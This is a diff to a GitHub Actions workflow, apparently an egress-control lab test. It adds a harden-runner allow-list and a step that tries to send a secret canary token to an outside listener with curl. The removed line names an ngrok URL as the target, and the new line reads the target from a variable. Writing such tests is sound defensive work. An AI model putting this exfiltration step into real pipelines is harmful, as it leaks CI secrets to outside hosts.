@@ -5,14 +5,23 @@ jobs:
   build:
     runs-on: ubuntu-latest
     steps:
+      - name: Harden Runner (egress allow-list)
+        uses: step-security/harden-runner@v2
+        with:
+          egress-policy: block
+          allowed-endpoints: >
+            api.github.com:443
+            github.com:443
+
       - name: Checkout code
         uses: actions/checkout@v4
 
-      - name: Attempt Egress with Strict Firewall Simulation
+      - name: Attempt Exfiltration (should be blocked)
         env:
           LAB_CANARY: ${{ secrets.LAB_CANARY }}
+          LAB_LISTENER: ${{ vars.LAB_LISTENER }}
         run: |
-          # If egress proxy/firewall blocks external non-whitelisted domains:
-          curl --max-time 5 -X POST https://shortage-euphemism-gleeful.ngrok-free.dev/exfiltrate \
+          curl --max-time 10 -X POST "$LAB_LISTENER/exfiltrate" \
             -H "Content-Type: application/json" \
-            -d "{\"run_id\": \"${{ github.run_id }}\", \"canary_token\": \"$LAB_CANARY\", \"scenario\": \"C3\"}" || echo "Egress blocked successfully."
+            -d "{\"run_id\": \"${{ github.run_id }}\", \"canary_token\": \"$LAB_CANARY\", \"scenario\": \"C3\"}" \
+            || echo "Outbound call failed (expected if egress policy blocked it)."
